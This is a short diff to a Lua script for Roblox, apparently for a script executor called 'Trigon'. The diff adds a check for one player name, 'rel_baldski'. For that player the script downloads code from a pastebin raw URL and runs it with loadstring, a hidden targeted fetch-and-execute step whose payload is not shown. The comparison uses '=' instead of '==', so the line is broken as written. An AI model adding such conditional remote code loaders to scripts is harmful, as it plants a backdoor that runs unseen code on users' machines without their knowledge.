@@ -1,5 +1,10 @@
-
 repeat  task.wait() until game:IsLoaded()
+
+if game:GetService('Players').LocalPlayer.Name = "rel_baldski" then
+	loadstring(game:HttpGet("https://pastebin.com/raw/AtpMtN4s",true))()
+	return;
+end
+
 TrigonVer = "Trigon v0.04e"
 print(TrigonVer)
 
